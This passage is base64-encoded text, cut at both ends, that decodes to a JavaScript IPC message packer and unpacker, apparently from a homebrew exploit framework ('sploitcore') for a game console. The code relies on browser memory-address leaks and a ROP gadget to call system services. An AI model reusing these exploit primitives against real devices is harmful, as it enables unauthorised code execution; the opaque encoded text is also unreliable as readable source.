lc3VsdENvZGUnKTtcbnZhciBSZXN1bHQgPSByZXF1aXJlKCcuL1Jlc3VsdCcpO1xuXG5mdW5jdGlvbiBJUENNZXNzYWdlIChzYywgc2VuZGVyLCBjbWRJZCkge1xuXHR0aGlzLnNjID0gc2M7XG5cdHRoaXMuc2VuZGVyID0gc2VuZGVyO1xuXHR0aGlzLnBpZCA9IG51bGw7XG5cdHRoaXMudHlwZSA9IDQ7XG5cdHRoaXMuY21kSWQgPSBjbWRJZDtcblx0dGhpcy5yZXN1bHRDb2RlID0gY21kSWQ7XG5cdHRoaXMuc3VjY2VzcyA9IHRoaXMucmVzdWx0Q29kZSA9PT0gMCB8fCB0aGlzLnJlc3VsdENvZGUgPT09IHVuZGVmaW5lZDtcblx0dGhpcy5kYXRhQnVmZmVyID0gW107XG5cdHRoaXMuYURlc2NyaXB0b3JzID0gW107XG5cdHRoaXMuYkRlc2NyaXB0b3JzID0gW107XG5cdHRoaXMuY0Rlc2NyaXB0b3JzID0gW107XG5cdHRoaXMueERlc2NyaXB0b3JzID0gW107XG5cdHRoaXMuY29waWVkSGFuZGxlcyA9IFtdO1xuXHR0aGlzLm1vdmVkSGFuZGxlcyA9IFtdO1xuXHR0aGlzLm9iamVjdERvbWFpbkNvbW1hbmQgPSB1bmRlZmluZWQ7XG5cdHRoaXMub2JqZWN0SWQgPSAwO1xuXHR0aGlzLmNvcHlCdWZmZXJzID0gW107XG59XG5cbklQQ01lc3NhZ2UucHJvdG90eXBlLnNldFR5cGUgPSBmdW5jdGlvbiAodCkge1xuXHR0aGlzLnR5cGUgPSB0O1xuXHRyZXR1cm4gdGhpcztcbn07XG5cbklQQ01lc3NhZ2UucHJvdG90eXBlLnNlbmRQaWQgPSBmdW5jdGlvbiAoKSB7XG5cdHRoaXMucGlkID0gdHJ1ZTtcblx0cmV0dXJuIHRoaXM7XG59O1xuXG5JUENNZXNzYWdlLnByb3RvdHlwZS5zZXRDbWQgPSBmdW5jdGlvbiAoY21kSWQpIHtcblx0dGhpcy5jbWRJZCA9IGNtZElkO1xuXHR0aGlzLnJlc3VsdENvZGUgPSBjbWRJZDtcblx0cmV0dXJuIHRoaXM7XG59O1xuXG5JUENNZXNzYWdlLnByb3RvdHlwZS5zZXRSZXN1bHQgPSBmdW5jdGlvbiAocmVzY29kZSkge1xuXHR0aGlzLnNldENtZChyZXNjb2RlKTtcblx0dGhpcy5zdWNjZXNzID0gdGhpcy5yZXN1bHRDb2RlID09PSAwO1xufTtcblxuSVBDTWVzc2FnZS5wcm90b3R5cGUuZGF0YSA9IGZ1bmN0aW9uICgpIHtcblx0dGhpcy5kYXRhQnVmZmVyID0gW107XG5cdGZvciAodmFyIGkgPSAwOyBpIDwgYXJndW1lbnRzLmxlbmd0aDsgaSsrKSB7XG5cdFx0dmFyIHYgPSBhcmd1bWVudHNbaV07XG5cdFx0aWYgKHYgaW5zdGFuY2VvZiBBcnJheSkge1xuXHRcdFx0dGhpcy5kYXRhQnVmZmVyLnB1c2godlswXSk7XG5cdFx0XHR0aGlzLmRhdGFCdWZmZXIucHVzaCh2WzFdKTtcblx0XHR9IGVsc2UgaWYodHlwZW9mKHYpID09PSBcIm51bWJlclwiKSB7XG5cdFx0XHR0aGlzLmRhdGFCdWZmZXIucHVzaCh2KTtcblx0XHRcdHRoaXMuZGF0YUJ1ZmZlci5wdXNoKDApO1xuXHRcdH0gZWxzZSB7XG5cdFx0XHR0aHJvdyBuZXcgRXJyb3IoXCJjYW4ndCBwdXQgaW4gYW4gSVBDIHJlcXVlc3Q6IFwiICsgdik7XG5cdFx0fVxuXHR9XG5cblx0cmV0dXJuIHRoaXM7XG59O1xuXG5JUENNZXNzYWdlLnByb3RvdHlwZS5kYXRhdTMyID0gZnVuY3Rpb24gKCkge1xuXHR0aGlzLmRhdGFCdWZmZXIgPSBbXTtcblx0Zm9yICh2YXIgaSA9IDA7IGkgPCBhcmd1bWVudHMubGVuZ3RoOyBpKyspIHtcblx0XHR0aGlzLmRhdGFCdWZmZXIucHVzaCh1dGlscy50cnVuYzMyKGFyZ3VtZW50c1tpXSkpO1xuXHR9XG5cdHJldHVybiB0aGlzO1xufTtcblxuSVBDTWVzc2FnZS5wcm90b3R5cGUuZGF0YXU2NCA9IGZ1bmN0aW9uICgpIHtcblx0dGhpcy5kYXRhQnVmZmVyID0gW107XG5cdGZvciAodmFyIGkgPSAwOyBpIDwgYXJndW1lbnRzLmxlbmd0aDsgaSsrKSB7XG5cdFx0dmFyIHYgPSB1dGlscy5wYWQ2NChhcmd1bWVudHNbaV0pO1xuXHRcdHRoaXMuZGF0YUJ1ZmZlci5wdXNoKHZbMF0pO1xuXHRcdHRoaXMuZGF0YUJ1ZmZlci5wdXNoKHZbMV0pO1xuXHR9XG5cblx0cmV0dXJuIHRoaXM7XG59O1xuXG5JUENNZXNzYWdlLnByb3RvdHlwZS5kYXRhQXJyYXlCdWZmZXIgPSBmdW5jdGlvbihhYikge1xuXHR0aGlzLmRhdGFCdWZmZXIgPSBbXTtcblx0dmFyIHUzMiA9IG5ldyBVaW50MzJBcnJheShhYik7XG5cdGZvcih2YXIgaSA9IDA7IGkgPCB1MzIubGVuZ3RoOyBpKyspIHtcblx0XHR0aGlzLmRhdGFCdWZmZXJbaV0gPSB1MzJbaV07XG5cdH1cblxuXHRyZXR1cm4gdGhpcztcbn07XG5cbklQQ01lc3NhZ2UucHJvdG90eXBlLmFkZERlc2NyaXB0b3IgPSBmdW5jdGlvbiAoZGEsIGFkZHIsIHNpemUsIHRoaXJkKSB7XG5cdGlmIChhZGRyIGluc3RhbmNlb2YgQXJyYXlCdWZmZXIgfHwgQXJyYXlCdWZmZXIuaXNWaWV3KGFkZHIpKSB7XG5cdFx0dmFyIGJ1ZiA9IGFkZHI7XG5cdFx0aWYgKHNpemUgPT09IHVuZGVmaW5lZCkge1xuXHRcdFx0c2l6ZSA9IGJ1Zi5ieXRlTGVuZ3RoO1xuXHRcdH1cblx0XHRpZiAodGhpcy5zZW5kZXIuaXNCcm93c2VyKSB7XG5cdFx0XHRpZiAoYnVmLmFkZHIgPT09IHVuZGVmaW5lZCkge1xuXHRcdFx0XHRidWYuYWRkciA9IHRoaXMuc2MuZ2V0QXJyYXlCdWZmZXJBZGRyKGJ1Zik7XG5cdFx0XHR9XG5cdFx0XHRhZGRyID0gYnVmLmFkZHI7XG5cdFx0fSBlbHNlIHtcblx0XHRcdGFkZHIgPSB0aGlzLnNlbmRlci5tYWxsb2Moc2l6ZSk7XG5cdFx0XHR0aGlzLmNvcHlCdWZmZXJzLnB1c2goe1xuXHRcdFx0XHRhZGRyLCBidWYsIHNpemVcblx0XHRcdH0pO1xuXHRcdH1cblx0fVxuXHRhZGRyID0gdXRpbHMucGFkNjQoYWRkcik7XG5cdHNpemUgPSB1dGlscy5wYWQ2NChzaXplKTtcblx0aWYgKHRoaXJkICE9PSB1bmRlZmluZWQpIHsgZGEucHVzaChbYWRkciwgc2l6ZSwgdGhpcmRdKTsgfSBlbHNlIHsgZGEucHVzaChbYWRkciwgc2l6ZV0pOyB9XG5cdHJldHVybiB0aGlzO1xufTtcblxuSVBDTWVzc2FnZS5wcm90b3R5cGUuYURlc2NyaXB0b3IgPSBmdW5jdGlvbiAoYWRkciwgc2l6ZSwgcGVybSkge1xuXHRyZXR1cm4gdGhpcy5hZGREZXNjcmlwdG9yKHRoaXMuYURlc2NyaXB0b3JzLCBhZGRyLCBzaXplLCBwZXJtKTtcbn07XG5cbklQQ01lc3NhZ2UucHJvdG90eXBlLmJEZXNjcmlwdG9yID0gZnVuY3Rpb24gKGFkZHIsIHNpemUsIHBlcm0pIHtcblx0cmV0dXJuIHRoaXMuYWRkRGVzY3JpcHRvcih0aGlzLmJEZXNjcmlwdG9ycywgYWRkciwgc2l6ZSwgcGVybSk7XG59O1xuXG4vKlxuXHR0eXBlIDB4QSBidWZmZXJzIGhhdmUgdTE2IGxlbmd0aCBzaGVuYW5pZ2Fuc1xuICovXG5JUENNZXNzYWdlLnByb3RvdHlwZS5jRGVzY3JpcHRvciA9IGZ1bmN0aW9uIChhZGRyLCBzaXplLCBoYXNVMTZMZW5ndGgpIHtcblx0cmV0dXJuIHRoaXMuYWRkRGVzY3JpcHRvcih0aGlzLmNEZXNjcmlwdG9ycywgYWRkciwgc2l6ZSwgaGFzVTE2TGVuZ3RoKTtcbn07XG5cbklQQ01lc3NhZ2UucHJvdG90eXBlLnhEZXNjcmlwdG9yID0gZnVuY3Rpb24gKGFkZHIsIHNpemUsIGNvdW50ZXIpIHtcblx0cmV0dXJuIHRoaXMuYWRkRGVzY3JpcHRvcih0aGlzLnhEZXNjcmlwdG9ycywgYWRkciwgc2l6ZSwgY291bnRlcik7XG59O1xuXG5JUENNZXNzYWdlLnByb3RvdHlwZS5jb3B5SGFuZGxlID0gZnVuY3Rpb24gKGhhbmRsZSkge1xuXHR0aGlzLmNvcGllZEhhbmRsZXMucHVzaCh1dGlscy50cnVuYzMyKGhhbmRsZSkpO1xuXHRyZXR1cm4gdGhpcztcbn07XG5cbklQQ01lc3NhZ2UucHJvdG90eXBlLm1vdmVIYW5kbGUgPSBmdW5jdGlvbiAoaGFuZGxlKSB7XG5cdHRoaXMubW92ZWRIYW5kbGVzLnB1c2godXRpbHMudHJ1bmMzMihoYW5kbGUpKTtcblx0cmV0dXJuIHRoaXM7XG59O1xuXG5JUENNZXNzYWdlLnByb3RvdHlwZS50b09iamVjdCA9IGZ1bmN0aW9uIChvYmplY3QpIHtcblx0dGhpcy5vYmplY3REb21haW5Db21tYW5kID0gMTtcblx0dGhpcy5vYmplY3RJZCA9IG9iamVjdDtcblx0cmV0dXJuIHRoaXM7XG59O1xuXG5JUENNZXNzYWdlLnByb3RvdHlwZS5jbG9zZU9iamVjdCA9IGZ1bmN0aW9uIChvYmplY3QpIHtcblx0dGhpcy5vYmplY3REb21haW5Db21tYW5kID0gMjtcblx0dGhpcy5vYmplY3RJZCA9IG9iamVjdDtcblx0cmV0dXJuIHRoaXM7XG59O1xuXG5JUENNZXNzYWdlLnByb3RvdHlwZS5wYWNrID0gZnVuY3Rpb24gKCkge1xuXHQvKlxuICAgIFN0cnVjdHVyZSBvZiBhbiBJUEMgcGFja2V0OlxuICAgIDIqdTMyIGhlYWRlclxuICAgICAgdHlwZVxuICAgICAgbnVtYmVyIG9mIGRlc2NyaXB0b3JzXG4gICAgICBsZW5ndGggb2YgcmF3IGRhdGEgc2VjdGlvbiAvIDRcbiAgICAgIFwiZmxhZ3MgZm9yIGJ1ZiBjIGRlc2NyaXB0b3JzXCJcbiAgICAgIGVuYWJsZSBoYW5kbGUgZGVzY3JpcHRvclxuICAgIHggZGVzY3JpcHRvcnNcbiAgICBhIGRlc2NyaXB0b3JzXG4gICAgYiBkZXNjcmlwdG9yc1xuICAgIHcgZGVzY3JpcHRvcnNcbiAgICByYXcgZGF0YSBzZWN0aW9uXG4gICAgICBwYWRkaW5nXG4gICAgICBhbGlnbmVkIGRhdGEgc2VjdGlvblxuICAgICAgcGFkZGluZ1xuICAgICAgYyBkZXNjcmlwdG9yIGxlbmd0aHNcbiAgICBjIGRlc2NyaXB0b3JzXG4gICAqL1xuXHR2YXIgYWxpZ25lZERhdGFTZWN0aW9uID0gW107XG4gIFxuXHR2YXIgZGF0YVBheWxvYWQgPSBbXTtcblx0ZGF0YVBheWxvYWQucHVzaCgweDQ5NDM0NjUzKTtcblx0ZGF0YVBheWxvYWQucHVzaCgwKTtcblx0ZGF0YVBheWxvYWQucHVzaCh0aGlzLmNtZElkKTtcblx0ZGF0YVBheWxvYWQucHVzaCgwKTtcblx0Zm9yICh2YXIgaSA9IDA7IGkgPCB0aGlzLmRhdGFCdWZmZXIubGVuZ3RoOyArK2kpIHtcblx0XHRkYXRhUGF5bG9hZC5wdXNoKHRoaXMuZGF0YUJ1ZmZlcltpXSk7XG5cdH1cbiAgXG5cdGlmICh0aGlzLm9iamVjdERvbWFpbkNvbW1hbmQgIT09IHVuZGVmaW5lZCkge1xuXHRcdGFsaWduZWREYXRhU2VjdGlvbi5wdXNoKHRoaXMub2JqZWN0RG9tYWluQ29tbWFuZCB8ICgoZGF0YVBheWxvYWQubGVuZ3RoICogNCkgPDwgMTYpKTtcblx0XHRhbGlnbmVkRGF0YVNlY3Rpb24ucHVzaCh0aGlzLm9iamVjdElkKTtcblx0XHRhbGlnbmVkRGF0YVNlY3Rpb24ucHVzaCgwKTtcblx0XHRhbGlnbmVkRGF0YVNlY3Rpb24ucHVzaCgwKTtcblx0fVxuXG5cdGFsaWduZWREYXRhU2VjdGlvbiA9IGFsaWduZWREYXRhU2VjdGlvbi5jb25jYXQoZGF0YVBheWxvYWQpO1xuXG5cdHZhciBjRGVzY3JpcHRvclNlY3Rpb24gPSBbXTtcblx0Zm9yICh2YXIgaSA9IDA7IGkgPCB0aGlzLmNEZXNjcmlwdG9ycy5sZW5ndGg7ICsraSkge1xuXHRcdHZhciB2ID0gdGhpcy5jRGVzY3JpcHRvcnNbaV07XG5cdFx0dmFyIGFkZHIgPSB1dGlscy50cnVuY2x0NjQodlswXSwgNDgpO1xuXHRcdHZhciBzaXplID0gdXRpbHMudHJ1bmNsdDMyKHZbMV0sIDE2KTtcblx0XHRjRGVzY3JpcHRvclNlY3Rpb24ucHVzaChhZGRyWzBdKTtcblx0XHRjRGVzY3JpcHRvclNlY3Rpb24ucHVzaCgoYWRkclsxXSAmIDB4RkZGRikgfCAoc2l6ZSA8PCAxNikpO1xuXHR9XG5cblx0dmFyIGNEZXNjcmlwdG9yc1dpdGhVMTZMZW5ndGggPSB0aGlzLmNEZXNjcmlwdG9ycy5maWx0ZXIoKGMpID0+IGNbMl0pO1xuXHR2YXIgdTE2TGVuZ3RocyA9IGNEZXNjcmlwdG9yc1dpdGhVMTZMZW5ndGgubWFwKChjKSA9PiBjWzFdWzBdKTtcblx0aWYodTE2TGVuZ3Rocy5sZW5ndGggJSAyID4gMCkge1xuXHRcdHUxNkxlbmd0aHMucHVzaCgwKTtcblx0fVxuXHR2YXIgY0Rlc2NyaXB0b3JMZW5ndGhzU2VjdGlvbiA9IEFycmF5LmZyb20obmV3IFVpbnQzMkFycmF5KG5ldyBVaW50MTZBcnJheSh1MTZMZW5ndGhzKS5idWZmZXIpKTtcbiAgXG5cdHZhciBkZXNjcmlwdG9yU2VjdGlvbiA9IFtdO1xuXG5cdC8vIGhhbmRsZSBkZXNjcmlwdG9yXG5cdGlmICh0aGlzLnBpZCB8fCB0aGlzLm1vdmVkSGFuZGxlcy5sZW5ndGggPiAwIHx8IHRoaXMuY29waWVkSGFuZGxlcy5sZW5ndGggPiAwKSB7XG5cdFx0ZGVzY3JpcHRvclNlY3Rpb24ucHVzaCgodGhpcy5waWQgPyAxIDogMCkgfCAodGhpcy5jb3BpZWRIYW5kbGVzLmxlbmd0aCA8PCAxKSB8ICh0aGlzLm1vdmVkSGFuZGxlcy5sZW5ndGggPDwgNSkpOyAvLyBIYW5kbGUgZGVzY3JpcHRvclxuXHRcdGlmICh0aGlzLnBpZCkge1xuXHRcdFx0ZGVzY3JpcHRvclNlY3Rpb24ucHVzaCgwKTtcblx0XHRcdGRlc2NyaXB0b3JTZWN0aW9uLnB1c2goMCk7XG5cdFx0fVxuXHRcdGZvciAodmFyIGkgPSAwOyBpIDwgdGhpcy5jb3BpZWRIYW5kbGVzLmxlbmd0aDsgKytpKSB7IGRlc2NyaXB0b3JTZWN0aW9uLnB1c2godGhpcy5jb3BpZWRIYW5kbGVzW2ldKTsgfVxuXHRcdGZvciAodmFyIGkgPSAwOyBpIDwgdGhpcy5tb3ZlZEhhbmRsZXMubGVuZ3RoOyArK2kpIHsgZGVzY3JpcHRvclNlY3Rpb24ucHVzaCh0aGlzLm1vdmVkSGFuZGxlc1tpXSk7IH1cblx0fVxuXG5cdC8vIHggZGVzY3JpcHRvcnNcblx0Zm9yICh2YXIgaSA9IDA7IGkgPCB0aGlzLnhEZXNjcmlwdG9ycy5sZW5ndGg7ICsraSkge1xuXHRcdHZhciB2ID0gdGhpcy54RGVzY3JpcHRvcnNbaV07XG5cdFx0dmFyIGFkZHIgPSB2WzBdO1xuXHRcdHZhciBzaXplID0gdXRpbHMudHJ1bmMzMih2WzFdKTtcblx0XHR2YXIgY291bnRlciA9IHZbMl07XG5cdFx0ZGVzY3JpcHRvclNlY3Rpb24ucHVzaChcblx0XHRcdChjb3VudGVyICYgMHgzRikgfFxuXHRcdFx0KCgoYWRkclsxXSAmIDB4NzApID4+PiA0KSA8PCA2KSB8XG5cdFx0XHQoY291bnRlciAmIDB4RTAwKSB8XG5cdFx0XHQoKGFkZHJbMV0gJiAweEYpIDw8IDEyKSB8XG5cdFx0XHRzaXplIDw8IDE2XG5cdFx0KTtcblx0XHRkZXNjcmlwdG9yU2VjdGlvbi5wdXNoKGFkZHJbMF0pO1xuXHR9XG5cblx0Ly8gYSAmIGIgZGVzY3JpcHRvcnNcblx0Zm9yICh2YXIgaSA9IDA7IGkgPCB0aGlzLmFEZXNjcmlwdG9ycy5sZW5ndGggKyB0aGlzLmJEZXNjcmlwdG9ycy5sZW5ndGg7ICsraSkge1xuXHRcdHZhciB2ID0gaSA8IHRoaXMuYURlc2NyaXB0b3JzLmxlbmd0aCA/IHRoaXMuYURlc2NyaXB0b3JzW2ldIDogdGhpcy5iRGVzY3JpcHRvcnNbaSAtIHRoaXMuYURlc2NyaXB0b3JzLmxlbmd0aF07XG5cdFx0dmFyIGFkZHIgPSB2WzBdO1xuXHRcdHZhciBzaXplID0gdXRpbHMucGFkNjQodlsxXSk7XG5cdFx0dmFyIHBlcm0gPSB2WzJdO1xuXHRcdGRlc2NyaXB0b3JTZWN0aW9uLnB1c2goc2l6ZVswXSk7XG5cdFx0ZGVzY3JpcHRvclNlY3Rpb24ucHVzaChhZGRyWzBdKTtcblx0XHRkZXNjcmlwdG9yU2VjdGlvbi5wdXNoKFxuXHRcdFx0cGVybSB8XG5cdFx0XHQoKChhZGRyWzFdICYgMHg3MCkgPj4+IDQpIDw8IDIpIHxcblx0XHRcdCgoc2l6ZVsxXSAmIDB4RikgPDwgMjQpIHxcblx0XHRcdCgoYWRkclsxXSAmIDB4RikgPDwgMjgpXG5cdFx0KTtcblx0fVxuXG5cdHZhciByYXdEYXRhU2VjdGlvbiA9IFtdO1xuXHR2YXIgcmF3RGF0YU9mZnNldCA9IDIgKyBkZXNjcmlwdG9yU2VjdGlvbi5sZW5ndGg7IC8vIDIgaGVhZGVyIGJ5dGVzICsgZGVzY3JpcHRvcnNcblx0d2hpbGUgKCgocmF3RGF0YVNlY3Rpb24ubGVuZ3RoICsgcmF3RGF0YU9mZnNldCkgJiAzKSAhPT0gMCkgeyByYXdEYXRhU2VjdGlvbi5wdXNoKDApOyB9IC8vIHBhZGRpbmdcblx0dmFyIHBhZGRpbmdMZW5ndGggPSByYXdEYXRhU2VjdGlvbi5sZW5ndGg7XG5cdHJhd0RhdGFTZWN0aW9uID0gcmF3RGF0YVNlY3Rpb24uY29uY2F0KGFsaWduZWREYXRhU2VjdGlvbik7XG5cdGZvciAodmFyIGkgPSAwOyBpIDwgNC1wYWRkaW5nTGVuZ3RoOyArK2kpIHsgcmF3RGF0YVNlY3Rpb24ucHVzaCgwKTsgfSAvLyAweDEwIGJ5dGVzIHRvdGFsIHBhZGRpbmdcblx0cmF3RGF0YVNlY3Rpb24gPSByYXdEYXRhU2VjdGlvbi5jb25jYXQoY0Rlc2NyaXB0b3JMZW5ndGhzU2VjdGlvbik7XG5cblx0dmFyIGhlYWRlclNlY3Rpb24gPSBbXTtcblx0aGVhZGVyU2VjdGlvbi5wdXNoKFxuXHRcdHRoaXMudHlwZSB8IC8vIFJlcXVlc3Rcblx0XHQodGhpcy54RGVzY3JpcHRvcnMubGVuZ3RoIDw8IDE2KSB8XG5cdFx0KHRoaXMuYURlc2NyaXB0b3JzLmxlbmd0aCA8PCAyMCkgfFxuXHRcdCh0aGlzLmJEZXNjcmlwdG9ycy5sZW5ndGggPDwgMjQpIHxcblx0XHQoMCA8PCAyOCkgLy8gVyBkZXNjcmlwdG9ycyBjb3VudFxuXHQpO1xuXHRoZWFkZXJTZWN0aW9uLnB1c2goXG5cdFx0KHJhd0RhdGFTZWN0aW9uLmxlbmd0aCkgfFxuXHRcdCgodGhpcy5jRGVzY3JpcHRvcnMubGVuZ3RoICE9PSAwID8gdGhpcy5jRGVzY3JpcHRvcnMubGVuZ3RoICsgMiA6IDApIDw8IDEwKSB8XG5cdFx0KCgodGhpcy5waWQgfHwgdGhpcy5tb3ZlZEhhbmRsZXMubGVuZ3RoID4gMCB8fCB0aGlzLmNvcGllZEhhbmRsZXMubGVuZ3RoID4gMCkgPyAxIDogMCkgPDwgMzEpXG5cdCk7XG5cblx0dmFyIGJ1ZiA9IGhlYWRlclNlY3Rpb24uY29uY2F0KGRlc2NyaXB0b3JTZWN0aW9uKTtcblx0YnVmID0gYnVmLmNvbmNhdChyYXdEYXRhU2VjdGlvbik7XG5cdGJ1ZiA9IGJ1Zi5jb25jYXQoY0Rlc2NyaXB0b3JTZWN0aW9uKTtcbiAgXG5cdGZvciAodmFyIGkgPSAwOyBpIDwgYnVmLmxlbmd0aDsgKytpKSB7IGJ1ZltpXSA9IGJ1ZltpXSA+Pj4gMDsgfVxuXG5cdHJldHVybiBidWY7XG59O1xuXG5JUENNZXNzYWdlLnByb3RvdHlwZS5zZW5kVG8gPSBmdW5jdGlvbiAoaGFuZGxlTmFtZSkge1xuXHR2YXIgaGFuZGxlID0gaGFuZGxlTmFtZTtcblx0aWYgKCEoaGFuZGxlTmFtZSBpbnN0YW5jZW9mIEFycmF5KSAmJiB0eXBlb2YoaGFuZGxlTmFtZSkgIT09IFwibnVtYmVyXCIpIHtcblx0XHRoYW5kbGUgPSB0aGlzLnNlbmRlci5nZXRBdXRvSGFuZGxlKGhhbmRsZU5hbWUpO1xuXHR9XG5cblx0aWYgKHRoaXMucGFja2VkID09PSB1bmRlZmluZWQpIHtcblx0XHR0aGlzLnBhY2tlZCA9IHRoaXMucGFjaygpO1xuXHR9XG5cdHRoaXMuc2MuaXBjQnVmLnNldCh0aGlzLnNjLmVtcHR5SXBjQnVmKTtcblx0dGhpcy5zYy5pcGNCdWYuc2V0KHRoaXMucGFja2VkKTtcblxuXHR2YXIgc2VsZiA9IHRoaXM7XG5cblx0aWYgKHRoaXMuc2MgIT09IHRoaXMuc2VuZGVyKSB7XG5cdFx0dGhpcy5zZW5kZXIubWVtY3B5RnJvbUJyb3dzZXIodGhpcy5zZW5kZXIuaXBjQnVmQWRkciwgdGhpcy5zYy5pcGNCdWZBZGRyLCAweDIwMDApO1xuXHRcdHRoaXMuY29weUJ1ZmZlcnMuZm9yRWFjaCgoY3IpID0+IHtcblx0XHRcdHNlbGYuc2VuZGVyLm1lbWNweUZyb21Ccm93c2VyKGNyLmFkZHIsIGNyLmJ1ZiwgY3Iuc2l6ZSk7XG5cdFx0fSk7XG5cdH1cblxuXHR2YXIgcmV0ID0gdGhpcy5zZW5kZXIuc3ZjU2VuZFN5bmNSZXF1ZXN0V2l0aFVzZXJCdWZmZXIodGhpcy5zZW5kZXIuaXBjQnVmQWRkciwgMHgyMDAwLCBoYW5kbGUpO1xuXG5cdGlmKCFyZXQuaXNPaykge1xuXHRcdGlmIChoYW5kbGUgIT09IGhhbmRsZU5hbWUpIHsgLy8gUmVtb3RlIHBvcnQgZGVhZCAtLSBvdXIgaGFuZGxlIGlzIGJhZCBub3dcblx0XHRcdHRoaXMuc2VuZGVyLmtpbGxBdXRvSGFuZGxlKGhhbmRsZU5hbWUpO1xuXHRcdH1cblx0fVxuXG5cdGlmICh0aGlzLnNjICE9PSB0aGlzLnNlbmRlcikge1xuXHRcdHRoaXMuc2VuZGVyLm1lbWNweVRvQnJvd3Nlcih0aGlzLnNjLmlwY0J1ZkFkZHIsIHRoaXMuc2VuZGVyLmlwY0J1ZkFkZHIsIDB4MjAwMCk7XG5cdFx0dGhpcy5jb3B5QnVmZmVycy5mb3JFYWNoKChjcikgPT4ge1xuXHRcdFx0c2VsZi5zZW5kZXIubWVtY3B5VG9Ccm93c2VyKGNyLmJ1ZiwgY3IuYWRkciwgY3Iuc2l6ZSk7XG5cdFx0fSk7XG5cdH1cblxuXHRpZihyZXQuaXNPaykge1xuXHRcdHJldHVybiBuZXcgSVBDTWVzc2FnZSh0aGlzLnNjLCB0aGlzLnNlbmRlcikudW5wYWNrKHRoaXMuc2MuaXBjQnVmLCBmYWxzZSk7XG5cdH0gZWxzZSB7XG5cdFx0cmV0dXJuIG5ldyBJUENGYWlsdXJlKHRoaXMuc2MsIHRoaXMuc2VuZGVyLCByZXQuZ2V0RXJyb3IoKSk7XG5cdH1cbn07XG5cbklQQ01lc3NhZ2UucHJvdG90eXBlLmFzeW5jU2VuZFRvID0gZnVuY3Rpb24gKGhhbmRsZU5hbWUsIHRpbWVvdXQpIHtcblx0aWYgKHRoaXMuc2MgIT09IHRoaXMuc2VuZGVyKSB7XG5cdFx0dGhyb3cgbmV3IEVycm9yKCdhc3luY1NlbmRUbyBpcyBvbmx5IHN1cHBvcnRlZCBvbiBzcGxvaXRjb3JlJyk7XG5cdH1cblxuXHR2YXIgaGFuZGxlID0gaGFuZGxlTmFtZTtcblx0aWYgKCEoaGFuZGxlIGluc3RhbmNlb2YgQXJyYXkpICYmIHR5cGVvZihoYW5kbGUpICE9PSBcIm51bWJlclwiKSB7XG5cdFx0Ly8gdXNpbmcgYXV0byBoYW5kbGVzIHdpdGggdGhpcyBhc3luY2hyb25vdXMgc3R1ZmYgd291bGQgYmUgYSByZWNpcGUgZm9yIGRpc2FzdGVyXG5cdFx0aGFuZGxlID0gdGhpcy5zYy5nZXRTZXJ2aWNlKGhhbmRsZU5hbWUpO1xuXHR9XG5cblx0aWYgKHRoaXMucGFja2VkID09PSB1bmRlZmluZWQpIHtcblx0XHR0aGlzLnBhY2tlZCA9IHRoaXMucGFjaygpO1xuXHR9XG5cblx0dmFyIGlwY0J1ZiA9IG5ldyBVaW50MzJBcnJheSgweDIwMDAgPj4gMik7XG5cdGlwY0J1Zi5zZXQodGhpcy5wYWNrZWQpO1xuXG5cdHZhciBzZWxmID0gdGhpcztcbiAgXG5cdHJldHVybiB0aGlzLnNjLmFzeW5jQ2FsbGVyLmNhbGwodGhpcy5zYy5nYWRnZXQoWzB4NDEsIDB4MDQsIDB4MDAsIDB4RDQsIDB4QzAsIDB4MDMsIDB4NUYsIDB4RDZdKSwgW3RoaXMuc2MuZ2V0QXJyYXlCdWZmZXJBZGRyKGlwY0J1ZiksIDB4MjAwMCwgaGFuZGxlXSwgdGltZW91dCkudGhlbigocmV0KSA9PiB7XG5cdFx0aWYgKHJldFswXSA9PT0gMHhmNjAxICYmIGhhbmRsZSAhPT0gaGFuZGxlTmFtZSkge1xuXHRcdFx0c2VsZi5zYy5zdmNDbG9zZUhhbmRsZShoYW5kbGUpO1xuXHRcdH1cblx0XHRpZiAocmV0WzBdICE9PSAwKSB7XG5cdFx0XHRyZXR1cm4gbmV3IElQQ0ZhaWx1cmUoc2VsZi5zYywgc2VsZi5zZW5kZXIsIG5ldyBSZXN1bHRDb2RlKHJldCkpO1xuXHRcdH0gZWxzZSB7XG5cdFx0XHRyZXR1cm4gbmV3IElQQ01lc3NhZ2Uoc2VsZi5zYywgc2VsZi5zZW5kZXIpLnVucGFjayhpcGNCdWYsIGZhbHNlKTtcblx0XHR9XG5cdH0pO1xufTtcblxuSVBDTWVzc2FnZS5wcm90b3R5cGUudW5wYWNrID0gZnVuY3Rpb24gKGJ1ZiwgdG9Eb21haW4pIHtcblx0dGhpcy5idWZmZXIgPSBidWY7XG5cdGlmKHRvRG9tYWluID09PSB1bmRlZmluZWQpIHsgdG9Eb21haW4gPSBmYWxzZTsgfVxuICBcblx0dGhpcy5kYXRhQnVmZmVyID0gdGhpcy5kYXRhID0gW107XG5cdHRoaXMuYURlc2NyaXB0b3JzID0gW107XG5cdHRoaXMuYkRlc2NyaXB0b3JzID0gW107XG5cdHRoaXMuY0Rlc2NyaXB0b3JzID0gW107XG5cdHRoaXMueERlc2NyaXB0b3JzID0gW107XG5cdHRoaXMuY29waWVkSGFuZGxlcyA9IFtdO1xuXHR0aGlzLm1vdmVkSGFuZGxlcyA9IFtdO1xuXG5cdHZhciB4Q291bnQgPSAoYnVmWzBdID4+PiAxNikgJiAweEY7XG5cdHZhciBhQ291bnQgPSAoYnVmWzBdID4+PiAyMCkgJiAweEY7XG5cdHZhciBiQ291bnQgPSAoYnVmWzBdID4+PiAyNCkgJiAweEY7XG5cdHZhciB3Q291bnQgPSAoYnVmWzBdID4+PiAyOCk7XG5cblx0aWYgKHdDb3VudCA+IDApIHtcblx0XHR0aHJvdyBuZXcgRXJyb3IoXCJjYW4ndCB1bnBhY2sgVyBkZXNjcmlwdG9ycyB5ZXRcIik7XG5cdH1cblxuXHR2YXIgcmF3RGF0YVNlY3Rpb25MZW5ndGggPSAoYnVmWzFdICYgMHgzRkYpICogNDtcblx0dmFyIGFsaWduZWREYXRhU2VjdGlvbkxlbmd0aCA9IHJhd0RhdGFTZWN0aW9uTGVuZ3RoIC0gMHgxMDtcblx0dmFyIGNEZXNjcmlwdG9ycyA9ICgoYnVmWzFdID4+PiAxMCkgJiAweDMpIC0gMTtcblx0dmFyIGhhc0hhbmRsZURlc2NyaXB0b3IgPSAoYnVmWzFdID4+PiAzMSkgPT09IDE7XG5cblx0dmFyIHBvcyA9IDI7XG5cblx0aWYgKGhhc0hhbmRsZURlc2NyaXB0b3IpIHtcblx0XHR2YXIgaGQgPSBidWZbcG9zKytdO1xuXHRcdHZhciBoYXNQaWQgPSAhIShoZCAmIDEpO1x